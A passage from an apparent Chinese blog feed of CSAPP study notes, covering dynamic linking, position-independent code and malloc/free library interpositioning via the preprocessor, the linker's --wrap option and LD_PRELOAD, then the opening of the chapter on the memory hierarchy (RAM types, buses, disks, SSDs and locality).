class="hljs-number">7</span>-动态链接库.png)<br><br>### 从应用程序中加载和链接共享库<br><br>应用程序允许它运行时要求动态链接器加载和链接某个共享库，而无需在编译时将那些库链接到应用中。<br><br>动态链接是一项强大有用的技术，有广泛的应用，例如：<br><br>- 分发软件：<br><br>  微软 Windows 应用的开发者常常利用共享库来分发软件更新。他们生成一个共享库的新版本，然后用户可以下载，并用它替代当前的版本。下一次他们运行应用程序时，应用将自动链接和加载新的共享库。<br><br>- 构建高性能 Web 服务器：<br><br>  早期的 Web 服务器通过使用 fork 和 execve 创建一个子进程，并在该子进程的上下文中运行 CGI 程序来生成动态内容。现代高性能的 Web 服务器可以使用基于动态接的更有效和完善的方法来生成动态内容。<br><br>其思路是将每个生成动态内容的函数打包在共享库中。当一个来自 Web 浏览器的请求到达时，服务器动态地加载和链接适当的函数，然后直接调用它，而不是使用 fork 和 execve 在子进程的上下文中运行函数。更进一步地说，在运行时无需停止服务器，就可以更新已存在的函数，以及添加新的函数。<br><br>Linux 为我们提供了一个接口—— `dlfcn.h` ，我们就可以利用文件中的一些函数来实时获取动态链接库的函数，使用函数指针接收。<br><br><br><br># 位置无关代码<br><br>可以加载而无需重定位的代码称为**位置无关代码**（Position-Independent Code，PIC）。用户对 GCC 使用 `-fpic` 选项指示 GNU 编译系统生成 PIC 代码。需要注意的是共享库的编译必须总是使用该选项。<br><br>无论我们在内存中的何处加载一个目标模块（包括共享目标模块），数据段与代码段的距离总是保持不变，我们也是运用这个事实来声称对全局变量的 PIC 引用的。<br><br>我们使用 PLT（过程链接表）和 GOT （全局偏移量表）来实现延迟绑定机制。~~这里不多说了~~<br><br><br><br># 库打桩机制<br><br>库打桩（library interpositioning）允许使用者截获对共享库函数的调用，取而代之执行自己的代码。使用打桩机制，可以追踪对某个特殊库函数的调用次数，验证和追踪它的输入和输出值，或者甚至把它替换成一个完全不同的实现。<br><br>打桩机制的基本思想是：<br><br>给定一个需要打桩的目标函数，创建一个包装函数，它的原型与目标函数完全一样。使用某种特殊的打桩机制，你就可以欺骗系统调用包装函数而不是目标函数了。包装函数通常会执行它自已的逻辑，然后调用月标函数，再将日标函数的返回值传递给调用者。<br><br>### 编译时打桩<br><br>先准备下面三个文件：<br><br><span class="hljs-built_in">malloc</span>.h：<br><br>```C<br><span class="hljs-meta">#<span class="hljs-keyword">define</span> malloc mymalloc</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> free myfree</span><br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">int</span>)</span>;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> *)</span>;<br></code></pre></td></tr></table></figure><p>malloc.c：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta"># <span class="hljs-keyword">ifdef</span> COMPILETIME</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-comment">/* malloc wrapper function */</span><br><span class="hljs-type">void</span> * <span class="hljs-title function_">mymalloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> * ptr = <span class="hljs-built_in">malloc</span>(size); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;malloc(%d)=%p\n&quot;</span>,(<span class="hljs-type">int</span>)size, ptr); <br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-comment">/* free wrapper function */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">myfree</span><span class="hljs-params">(<span class="hljs-type">void</span> * ptr)</span><br>&#123;<br>    <span class="hljs-built_in">free</span> (ptr); <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>&#125;<br><span class="hljs-meta"># <span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;malloc.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br>    <span class="hljs-built_in">free</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><p>我们想要 <code>mymalloc.c</code> 中的包装函数调用目标函数，打印追踪记录，并返回。只需要像下面这两条命令一样编译程序：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -I.-o intc int.c mymalloc.o<br></code></pre></td></tr></table></figure><p>由于有 <code>-I</code>参数，所以会进行打桩，它告诉 C 预处理器在搜索通常的系统目录之前,先在当前目录中查找 <code>malloc.h</code>。</p><h3 id="链接时打桩"><a href="#链接时打桩" class="headerlink" title="链接时打桩"></a>链接时打桩</h3><p>我们调用 <code>-wrap f</code> 标志进行链接时打桩。</p><p>链接时库打桩不能自定义调用名，在我们自己写的模块中，我们定义的函数必须是 <code>__wrap_xxx</code> ，比如 <code>__wrap_malloc</code> ，我们在 <code>__wrap_malloc</code> 中调用真实的 <code>malloc</code> 要写成 <code>__real_malloc</code> 去调用。</p><p>我们在 malloc 和 free 两个函数打桩，可以使用下面的命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -g -Wl,--wrap,malloc -Wl,--wrap,free -o a.out main.o malloc.o<br></code></pre></td></tr></table></figure><p>每个 <code>-Wl,--wrap,xxx</code> 就表示使用 <code>__wrap_xxx</code> 函数去替换 <code>xxx</code> 函数。</p><h3 id="运行时打桩"><a href="#运行时打桩" class="headerlink" title="运行时打桩"></a>运行时打桩</h3><p>编译时打桩需要能够访问程序的源代码，链接时打桩需要能够访问程序的可重定位对象文件。不过，基于动态链接器的 LD_PRELOAD 环境变量机制能够在运行时打桩，它只需要能够访问可执行目标文件。</p><blockquote><p>如果 LD_PRELOAD 环境变量被设置为一个共享库路径名的列表(以空格或分号分隔),那么当你加载和执行一个程序，需要解析未定义的引用时，动态链接器（LD-LINUX.SO）会先搜索 LD_PRELOAD 库，然后才搜索任何其他的库。</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">//malloc.c</span><br><span class="hljs-meta"># <span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta"># <span class="hljs-keyword">include</span> <span class="hljs-string">&lt;dlfcn.h&gt;</span></span><br><span class="hljs-comment">/* malloc wrapper function */</span><br><br><span class="hljs-type">void</span> * <span class="hljs-title function_">malloc</span><span class="hljs-params">(<span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-type">void</span> *(* mallocp) (<span class="hljs-type">size_t</span> size); <br>    mallocp = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;malloc&quot;</span>); <span class="hljs-comment">/* Get address of libc malloc */</span><br>    <span class="hljs-type">char</span> * ptr = mallocp(size); <span class="hljs-comment">/* Call libc malloc */</span><br>    <span class="hljs-keyword">return</span> ptr;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">free</span><span class="hljs-params">(<span class="hljs-type">void</span> *ptr)</span><br>&#123;<br>    <span class="hljs-type">void</span> (*freep) (<span class="hljs-type">void</span> *) = <span class="hljs-literal">NULL</span>; <br>    <span class="hljs-keyword">if</span> (!ptr)<br>        <span class="hljs-keyword">return</span>; <br>    freep = dlsym(RTLD_NEXT, <span class="hljs-string">&quot;free&quot;</span>); <span class="hljs-comment">/* Get address of libc free:*/</span> <br>    freep(ptr); <span class="hljs-comment">/* Call libc free */</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;free(%p)\n&quot;</span>, ptr);<br>&#125;<br></code></pre></td></tr></table></figure><p>使用命令 <code>gcc malloc.c -o malloc.so -ldl -shared -fPIC</code> 编译得到 <code>.so</code> 库。</p><p>然后使用命令 <code>LD_PRELOAD=&quot;./malloc.so&quot; ./xxxx</code> 来运行时加载 <code>malloc.so</code> 进行打桩。</p><h1 id="处理目标文件的工具"><a href="#处理目标文件的工具" class="headerlink" title="处理目标文件的工具"></a>处理目标文件的工具</h1><ul><li>ar：创建静态库，插入、删除、列出和提取成员。</li><li>strings：列出一个目标文件中所有可打印的字符串。</li><li>strip：从目标文件中删除符号表信息。</li><li>nm：列出一个目标文件的符号表中定义的符号。</li><li>size：列出目标文件中节的名字和大小。</li><li>readelf：显示一个目标文件的完整结构，包括ELF头中编码的所有信息。包含 SIZE 和 NM 的功能。</li><li>objdump：所有二进制工具之母。能够显示一个目标文件中所有的信息。它最大勺作用是反汇编.text节中的二进制指令。</li><li>ldd：列出一个动态链接 ELF 文件的链接库</li></ul><blockquote><p>那些没有符号表的题目是不是就是用了 strip 命令！</p></blockquote><hr><p>这里的知识都是学过的，所以进行起来比较快</p><p>打桩是新知识！感觉很神奇！🤗</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第六章 存储器层次结构</title>
    <link href="/2023/11/25/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/"/>
    <url>/2023/11/25/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/</url>
    
    <content type="html"><![CDATA[<p>存储器系统各层的原理和属性</p><span id="more"></span><p>在对系统的研究学习中，我们假定了一个简单的计算机系统模型，CPU 执行指令，而存储器系统为 CPU 存放指令和数据。在简单模型中，存储器系统是一个线性的字节数组，而 CPU能够在一个常数时间内访问每个存储器位置。</p><p>实际上，存储器系统 (memory systcm) 是一个具有不同容量、成本和访问时间的存储设备的<strong>层次结构</strong>。CPU 寄存器保存着最常用的数据。越靠近 CPU 的存储器读写速度越快，容量越小。</p><h1 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h1><p>基本的存储技术有：SRAM 存储器、DRAM 存储器、ROM存储器以及旋转的和固态的硬盘</p><h3 id="随机访问存储器"><a href="#随机访问存储器" class="headerlink" title="随机访问存储器"></a>随机访问存储器</h3><p>随机访问存储器（Random-Access Memory，RAM）分为两类：静态的和动态的。其中静态 RAM（SRAM）比动态的（DRAM）更快，但也更贵。</p><p>SRAM 用来作为高速缓存存器，既可以在 CPU 芯片上，也可以在片下。DRAM 用来作为主存以及图形系统的帧缓冲区。</p><h4 id="静态RAM（SRAM）"><a href="#静态RAM（SRAM）" class="headerlink" title="静态RAM（SRAM）"></a>静态RAM（SRAM）</h4><p>SRAM 将每个位存储在一个<strong>双稳态</strong>的（bistable）存储器单元里。它的属性是：可以无限期地保持在两个不同的电压配置(configuration)或状态(state)之一，其他任何状态都是不稳定的。</p><p>如下图：中间图的状态虽然可以保持，但实际上是亚稳态的——只要有细微的扰动就会破坏它所谓的稳态，最后都会趋于最左或最右的状态。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-SRAM%E5%8F%8C%E7%A8%B3%E6%80%81.png"></p><p>由于 SRAM 存储器单元的双稳态特性，只要有电，它就会永远地保持它的值。即使有干扰（例如电子噪音）来扰乱电压，当干扰消除时，电路就会恢复到稳定值。</p><h4 id="动态RAM（DRAM）"><a href="#动态RAM（DRAM）" class="headerlink" title="动态RAM（DRAM）"></a>动态RAM（DRAM）</h4><p>DRAM 将每个位存储为对一个电容的充电。与 SRAM 不同，DRAM 存储器单元对干扰非常敏感。当电容的电压被扰乱之后，它就永远不会恢复了。</p><p>会有很多原因导致 DRAM 漏电，使得 DRAM 单元在 10~100 毫秒时间内失去电荷。但是因为这时间还是足够长的，我们可以周期性地重写来刷新每一位，或者使用纠错码发现每个单元的错误位。</p><p>下表展示了 SRAM 和 DRAM 的特性：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-SRAM-DRAM%E5%AF%B9%E6%AF%94.png"></p><h4 id="传统的DRAM"><a href="#传统的DRAM" class="headerlink" title="传统的DRAM"></a>传统的DRAM</h4><p>DRAM 芯片中的单元（位）被分成 d 个超单元（supercell），每个超单元都由 w 个 DRAM 单元组成。</p><p>如下图展示的是一个 16X8 的 DRAM 芯片的组织：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E4%BC%A0%E7%BB%9FDRAM.png"></p><p>信息通过引脚的外部连接器流入和流出芯片，每个引脚传递一位信号。如上图 data 和 addr 都是引脚：8 个 data 引脚，传送一个字节到芯片或从芯片传出一个字节； 2 个 addr 引脚，它们携带 2 位的行和列超单元地址。</p><p>每个 DRAM 芯片被连接到某个称为内存控制器（emory controller）的电路，这个电路可以一次传送 w 位到每个 DRAM 芯片或一次从每个 DRAM 芯片传出 w 位。为了读出超单元 <code>(i,j)</code>的内容，内存控制器将行地址发送到 DRAM，然后是列地址j。DRAM 把超单元 <code>(i,j)</code> 的内容发回给控制器为响应。行地址称为 RAS（Row Access Strobe，行访问选通脉冲）请求。列地址 i 称为 CAS（Column Access Strobe，列访问选通脉冲）请求。</p><p>需要注意的是，RAS 和 CAS 请求共享相同的 DRAM 地址引脚。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AF%BB%E4%B8%80%E4%B8%AADRAM%E7%9A%84%E5%86%85%E5%AE%B9.png"></p><h4 id="内存模块"><a href="#内存模块" class="headerlink" title="内存模块"></a>内存模块</h4><p>DRAM 芯片封装在内模块（memory module）中</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%86%85%E5%AD%98%E6%A8%A1%E5%9D%97.png"></p><p>要取出内存地址 A 处的一个字，内存控制器将 A 转换成一个超单元地址 <code>(i,j)</code> ，并将它发送到内存模块，然后内存模块再将和广播到每个 DRAM。作为响应，每个 DRAM 输出它的 <code>(i,j)</code> 超单元的8 位内容。模块中的电路收集这些输出，并把它们合并成一个 64 位字，再返回给内存控制器。</p><h4 id="非易失性存储器"><a href="#非易失性存储器" class="headerlink" title="非易失性存储器"></a>非易失性存储器</h4><p>如果断电，DRAM 和 SRAM 会丢失它们的信息，从这个意义上说，它们是易失的（volatile）。而非易失性存储器（nonvolatile memory）即使是在关电后仍然保存着它们的信息。</p><p>存储在 ROM 设备中的程序通常被称为固件（firmware）。</p><h4 id="访问主存"><a href="#访问主存" class="headerlink" title="访问主存"></a>访问主存</h4><p>数据流通过称为总线（bus）的共享电子电路在处理器和 DRAM 主存之间传递信息。每次CPU 和主存之间的数据传送都是通过一系列步骤来完成的，这些步骤称为总线事务（bus transaction）：</p><ul><li>读事务（read transaction）从主存传送数据到 CPU。</li><li>写事务（write transaction）从 CPU 传送数据到主存</li></ul><p>总线是一组并行的导线，能携带地址、数据和控制信号。控制线携带的信号会同步事务，并标识出当前正在被执行的事务的类型。</p><p>如下图便是一个计算机系统的配置：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E6%80%BB%E7%BA%BF%E7%BB%93%E6%9E%84.png"></p><p>系统总线（system bus）连接 CPU 和 I&#x2F;O 桥接器，内存总线（memory bus）连接 I&#x2F;O 桥接器和主存。</p><p>接下来我们看两个实例：</p><p>CPU 执行 <code>movq A %rax</code> 这个操作时，地址 A 存储的内容将被加载到寄存器 %rax 中，总线接口会在总线上发起<strong>读事务</strong>，读事务有三个步骤组成：</p><ul><li>首先 CPU 将地址 A 放到系统总线上，I&#x2F;O 桥将信号传递到内存总线。</li><li>接下来主存检测到内存总线上的地址信号，从内存总线读地址，从 DRAM 中读取数据字，并将数据写到内存总线。 I&#x2F;O 桥将内存总线信号翻译成系统总线信号，沿着总线传递。</li><li>最后 CPU 检测到总线上的数据并读取，将其复制到寄存器 %rax 中。</li></ul><p>具体如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AF%BB%E4%BA%8B%E5%8A%A1.png"></p><p>CPU 执行 <code>movq %rax,A</code> 这个操作时，寄存器 %rax 的内容被写到地址 A ，CPU 会发起写事务。同样，写事务也有三个基本步骤：</p><ul><li><p>首先 CPU 将地址放在内存总线上，内存从总线读出地址并等待数据到达</p></li><li><p>CPU 将 %rax 中的数据字复制到系统内存总线</p></li><li><p>最后主存从内存总线读出数据字，并将这些位存储在 DRAM 中</p></li></ul><p>具体如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E5%86%99%E4%BA%8B%E5%8A%A1.png"></p><h3 id="磁盘存储"><a href="#磁盘存储" class="headerlink" title="磁盘存储"></a>磁盘存储</h3><p>磁盘是广为应用的保存大量数据的存储设备，存储数据的数量比 RAM 大得多，但从磁盘读取数据也要比 RAM 慢许多。</p><h4 id="磁盘构造"><a href="#磁盘构造" class="headerlink" title="磁盘构造"></a>磁盘构造</h4><p>磁盘驱动器（disk drive），简称磁盘。一个磁盘是由多个<strong>盘片</strong>构成的，封装在一个密封的容器里。每个盘片有两面（或者称为表面）覆盖着磁性记忆材料。转盘中间有一个可以选装的主轴，使得盘片以固定的旋转速率旋转。</p><p>每个盘片包含多个同心圆组成的磁道，每个磁道会被划分为一组扇区，每个扇区包含相等数量的数据位（通常是512字节）。扇区之间由一些间隙（gap）分隔开,这些间隙中不存储数据位。间隙存储用来标识扇区的格式化位。</p><p><strong>柱面</strong>是指每个盘的同一磁道的集合，比如每个盘的第一个同心圆组成了第一个柱面。</p><h4 id="磁盘容量"><a href="#磁盘容量" class="headerlink" title="磁盘容量"></a>磁盘容量</h4><p>磁盘上可记录的最大位数成为它的最大容量，或者简称容量。磁盘容量由以下技术因素决定：</p><ul><li>记录密度（recoding density）（位&#x2F;英寸）：磁道一英寸的段中可以放入的位数。</li><li>磁道密度（trackdensity）（道&#x2F;英寸）：从盘片中心出发半径上一英寸的段内可以有的磁道数目</li><li>面密度（areal density）（位&#x2F;平方英寸）：记录密度与磁道密度的乘机</li></ul><p>我们计算面密度只要根据下面的公式即可：<br>$$<br>磁盘容量&#x3D;\frac{字节数}{扇区}\times\frac{平均扇区数}{磁道}\times\frac{磁道数}{表面}\times\frac{表面数}{盘片}\times\frac{盘片数}{磁盘}<br>$$</p><h4 id="磁盘操作"><a href="#磁盘操作" class="headerlink" title="磁盘操作"></a>磁盘操作</h4><p>磁盘用读&#x2F;写头（read&#x2F;write head）来读写存储在习性表面的位，而读写头连接到一个传动臂的一端。每个盘面都有一个独立的读&#x2F;写头。读&#x2F;写头垂直排列，一致行动。在任何时刻，所有的读&#x2F;写头都位于同一个柱面上。</p><p>通过沿着半径轴前后移动这个传动臂，驱动器可以将读&#x2F;写头定位在盘面上的任何磁道上。这样的机械运动称为<strong>寻道（seek）</strong>。</p><p>如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E7%A3%81%E7%9B%98%E7%9A%84%E5%8A%A8%E6%80%81%E7%89%B9%E6%80%A7.png"></p><p>读写头在磁盘表面大约 0.1 微米处飞翔<del>（这应该是直译来的叭不过也是生动形象嗷）</del>，所以盘面上微小的灰尘也会影响读写操作，如果读写头遇到了灰尘这类障碍物就会停下来，撞到盘面，这就是所谓的<strong>读&#x2F;写头冲撞</strong>。因此磁盘总是密封的。</p><p>磁盘以扇区大小的块来读写数据。对扇区的访问时间（access time）有三个主要的部分：</p><ul><li>寻道时间（seek time）：为了读取某个目标扇区的内容，传动首先将读&#x2F;写头定位到包含目标扇区的磁道上。移动传动臂所需的时间称为寻道时间。</li><li>旋转时间（rotational latency）：一旦读&#x2F;写头定位到了期望的磁道，驱动器等待目标扇区的第一个位旋转到读&#x2F;写头下。这个步骤的性能依赖于当读&#x2F;写头到达目标扇区时盘面的位置以及磁盘的旋转速度。</li><li>传送时间（transfer time）：一个扇区的传送时间依赖于旋转速度和每条磁道的扇区数目。</li></ul><h4 id="逻辑磁盘块"><a href="#逻辑磁盘块" class="headerlink" title="逻辑磁盘块"></a>逻辑磁盘块</h4><p>我们所看到的磁盘比较复杂，为了便于操作系统读取磁盘数据，现代磁盘为我们构造了一个简单的视图，是一个 B 个扇区大小的逻辑块序列，磁盘封装中有一个设备叫<strong>磁盘控制器</strong>维护了逻辑块号（对操作系统的抽象）和磁盘扇区（物理扇区）之间的映射关系。</p><p>操作系统想要执行 IO 操作读写文件的时候，就会发送一个逻辑块号给<strong>磁盘控制器</strong>翻译成一个三元组（盘面，磁道，扇区）找到对应的值进行读写。</p><h4 id="连接-I-x2F-O-设备"><a href="#连接-I-x2F-O-设备" class="headerlink" title="连接 I&#x2F;O 设备"></a>连接 I&#x2F;O 设备</h4><p>输人&#x2F;输出（I&#x2F;O）设备，都是通过 I&#x2F;O 总线连接到CPU和主存的。</p><p>有以下集中设备可以连接到总线：</p><ul><li>通用串行总线（Universal Serial Bus，USB）控制器是一个连接到USB总线的设备的中转机构，USB 总线是一个广泛使用的标准。</li><li>图形卡（或适配器）包含硬件和软件逻辑，它们负责代表CPU在显示器上画像素。</li><li>主机总线适配器连接磁盘。</li><li>其他的设备，例如网络适配器，可以通过将适配器插入到主板上空的扩展槽中，从而连接到 I&#x2F;O 总线，这些插槽提供了到总线的直接电路连接。</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-IO%E8%AE%BE%E5%A4%87.png"></p><h4 id="访问磁盘"><a href="#访问磁盘" class="headerlink" title="访问磁盘"></a>访问磁盘</h4><p>CPU 使用一种称为内存映I&#x2F;O（memory-mapped I&#x2F;O）的技术来向I&#x2F;O设备发射命令。在使用内存映射 I&#x2F;O 的系统中，地址空间中有一块地址是为与 I&#x2F;O 设备通信保留的，这样的地址称为一个 I&#x2F;O 端口。</p><p>当一个设备连接到总线时，它与个或多个端口相关联（或它被映射到一个或多个端口）。</p><p> <img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E8%AE%BF%E9%97%AE%E7%A3%81%E7%9B%98.png"></p><p>一般发出请求之后，CPU就会去做其他的工作，因为读取磁盘相对于执行指令来说是慢了好几个数量级的。</p><p>在磁盘控制器收到指令之后，将逻辑块信号翻译成扇区地址，读该扇区的内容，然后将这些内容直接传送到主存，不需要 CPU 来干涉。这种设备可以自己执行读写而不需要 CPU 的干涉的过程称为<strong>直接内存访问（Direct Memory Access，DMA）</strong></p><p>传送完成之后，磁盘控制器会给 CPU 发一个中断信号来通知 CPU 已经完成了数据传送的操作。基本思想就是通过发送信号给 CPU 芯片的外部引脚，让 CPU 暂停执行的工作，跳转到一个操作系统的例程，执行完一些擦做之后回到被中断的地方。</p><h4 id="固态硬盘"><a href="#固态硬盘" class="headerlink" title="固态硬盘"></a>固态硬盘</h4><p>固态硬盘（Solid Stack Disk，SSD）是一种基于闪存的存储技术。</p><p>一个 SSD 封装由一个或者多个闪存芯片和闪存翻译层组成，闪存芯片替代传统旋转磁盘中的机械驱动器，而闪存翻译层是一个硬件&#x2F;固件设备，扮演与磁盘控制器相同的角色，将对逻辑块的诺求翻译成对底层物理设备的访问。</p><p>SSD 的读比写要快得多，性能差别是有底层的闪存基本属性来决定的。一个闪存由 B 个快的序列组成，每个块由 P 页组成，而<strong>数据是以页的单位来读写的</strong>。只有在一页所属的块整个被擦除之后，才能写这一页（通常是指该块中的所有位都被设置为1）。不过，一旦一个块被擦除了，块中每一个页都可以不需要再进行擦除就写一次。在大约进行100000次重复写之后，块就会磨损坏。只要有一个块磨损坏，这个硬盘就不能再使用了。</p><p>固态硬盘能耗低，速度快，但是反复写之后会磨损。闪存翻译层中的<strong>平均磨损逻辑</strong>试图通过将曹处平均分配在所有的块上来最大化每个块的寿命。同样，高性能带来的必定是昂贵的价格，不过因为 SSD 越来越受欢迎，它们之间的价格差距也在逐步减少。</p><h4 id="存储技术趋势"><a href="#存储技术趋势" class="headerlink" title="存储技术趋势"></a>存储技术趋势</h4><p>我们对存储技术的研究，有以下几点重要的思想：</p><ul><li><p>不同的处处技术有不同的价格和性能折中。</p><p>在存储速度方面，SRAM &gt; DRAM &gt; SSD &gt; 旋转磁盘，同样性能高的硬件设备的造假也更高</p></li><li><p>不同存储技术的价格和性能属性变化的速率不同</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%AD%98%E5%82%A8%E5%99%A8%E4%BD%93%E7%B3%BB%E7%BB%93%E6%9E%84/6-%E6%80%A7%E8%83%BD%E5%8F%98%E5%8C%96.png"></p></li></ul><h1 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h1><p>计算机程序通常是具有局部性的，它们会倾向于引用自己附近的内存区域或者是自己本身，比如一个循环程序，它就会反复执行一个局部的代码或者是局部的一个变量，这种倾向性被称为<strong>局部性原理</strong>。</p><ul><li>时间局部性：被引用过的内存位置很有可能再被多次引用</li><li>空间局部性：如果一个内存被引用过一次，那么很有可能引用附近的一个内存位置</li></ul><blockquote><p>只要目标函数满足其一，我们就称这个函数 ” 有良好的局部性 “ </p></blockquote><h3 id="对数据引用的局部"><a href="#对数据引用的局部" class="headerlink" title="对数据引用的局部"></a>对数据引用的局部</h3><p>我们来看一个例子，下面的函数对向量的元素求和：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">sumvec</span><span class="hljs-params">(<span class="hljs-type">int</span> v[N])</span><br>&#123;<br>    <span class="hljs-type">int</span> i,sum=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        sum+=v[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> sum;   <br>&#125;<br></code></pre></td></tr></table></figure><p>N&#x3D;8 